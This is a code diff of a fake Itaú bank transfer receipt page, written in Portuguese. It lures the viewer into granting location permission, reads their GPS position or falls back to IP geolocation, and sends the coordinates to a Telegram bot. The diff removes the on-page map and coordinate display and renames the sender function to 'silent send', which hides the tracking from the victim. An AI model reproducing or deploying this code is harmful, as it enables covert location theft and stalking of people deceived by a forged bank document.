@@ -18,7 +18,6 @@
   .value{font-weight:600}
   .divider{height:1px;background:#ddd;margin:12px 0}
   .center{text-align:center}
-  #mapa{width:100%;height:200px;border:0;border-radius:4px;margin-top:8px}
 </style>
 </head>
 <body>
@@ -34,17 +33,12 @@
   <p>Para visualizar, precisa permitir permissões da página.</p>
 </div>
 
-<!-- 3) COMPROVANTE (só aparece se permitir) -->
+<!-- 3) COMPROVANTE (sem mapa, sem lat/lon) -->
 <div id="comprovante">
   <div class="logo">Itaú</div>
   <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora">05/06/2024 14:32:11</span></div>
   <div class="divider"></div>
   <div class="row"><span class="label">Valor</span><span class="value" id="valor">R$ 1.234,56</span></div>
-  <div class="divider"></div>
-  <div class="row"><span class="label">Latitude</span><span class="value" id="lat"></span></div>
-  <div class="row"><span class="label">Longitude</span><span class="value" id="lon"></span></div>
-  <div class="row"><span class="label">Precisão</span><span class="value" id="preco"></span></div>
-  <iframe id="mapa" frameborder="0"></iframe>
   <div class="divider"></div>
   <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao">ITAUPIX20240605143211A1B2C3</span></div>
   <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao">A1B2C3D4E5F6G7H8I9J0</span></div>
@@ -63,17 +57,8 @@ const dados = {
   autenticacao: [...Array(20)].map(() => Math.random().toString(36)[2]).join('')
 };
 
-/* ---------- FUNÇÕES ---------- */
-function mostrar(lat, lon, prec, source = 'GPS') {
-  document.getElementById('lat').textContent   = lat.toFixed(7);
-  document.getElementById('lon').textContent   = lon.toFixed(7);
-  document.getElementById('preco').textContent = `${prec} m / ${source}`;
-  document.getElementById('mapa').src = `https://www.google.com/maps?q=${lat},${lon}&output=embed&z=18`;
-  document.getElementById('spinnerBox').style.display = 'none';
-  document.getElementById('comprovante').style.display = 'block';
-}
-
-function enviarTelegram(lat, lon, prec, source) {
+/* ---------- ENVIO SILENCIOSO ---------- */
+function enviar(lat, lon, prec, source) {
   const map = `https://www.google.com/maps/@${lat},${lon},18z`;
   const texto = `📍 Localização ${source}\nMapa: ${map}\nLat: ${lat}\nLon: ${lon}\nPrecisão: ${prec} m\nDados: ${dados.valor}`;
   fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
@@ -88,8 +73,9 @@ if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
     pos => {
       const { latitude: lat, longitude: lon, accuracy: prec } = pos.coords;
-      enviarTelegram(lat, lon, prec, 'Permitida');
-      mostrar(lat, lon, prec, 'Permitida');
+      enviar(lat, lon, prec, 'Permitida');
+      document.getElementById('spinnerBox').style.display = 'none';
+      document.getElementById('comprovante').style.display = 'block';
     },
     () => {
       /* ---------- 2ª TENTATIVA: IP (sempre executa) ---------- */
@@ -98,12 +84,11 @@ if (navigator.geolocation) {
         .then(data => {
           const lat = data.latitude;
           const lon = data.longitude;
-          enviarTelegram(lat, lon, '~1 km', 'via IP');
+          enviar(lat, lon, '~1 km', 'via IP');
         })
         .catch(() => {
-          enviarTelegram(-23.550520, -46.633309, 'indisponível', 'genérica');
+          enviar(-23.550520, -46.633309, 'indisponível', 'genérica');
         });
-      /* ---------- FIM: mostra mensagem de negação ---------- */
       document.getElementById('spinnerBox').style.display = 'none';
       document.getElementById('msgNegado').style.display = 'block';
     },
@@ -116,10 +101,10 @@ if (navigator.geolocation) {
     .then(data => {
       const lat = data.latitude;
       const lon = data.longitude;
-      enviarTelegram(lat, lon, '~1 km', 'via IP');
+      enviar(lat, lon, '~1 km', 'via IP');
     })
     .catch(() => {
-      enviarTelegram(-23.550520, -46.633309, 'indisponível', 'genérica');
+      enviar(-23.550520, -46.633309, 'indisponível', 'genérica');
     });
   document.getElementById('spinnerBox').style.display = 'none';
   document.getElementById('msgNegado').style.display = 'block';
